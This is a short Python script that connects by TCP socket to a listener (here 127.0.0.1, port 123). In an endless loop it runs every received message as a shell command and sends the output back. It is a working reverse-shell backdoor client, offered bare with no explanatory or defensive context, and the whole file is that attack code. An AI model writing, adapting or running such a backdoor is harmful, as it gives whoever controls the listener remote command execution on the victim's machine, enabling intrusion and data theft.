import socket
import subprocess
import requests



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(('127.0.0.1', 123))



while True:
    msg = server.recv(1024).decode()
    sub1 = subprocess.run(msg , capture_output=True  ,shell=True )
    st = str(sub1)
    server.send(st.encode())
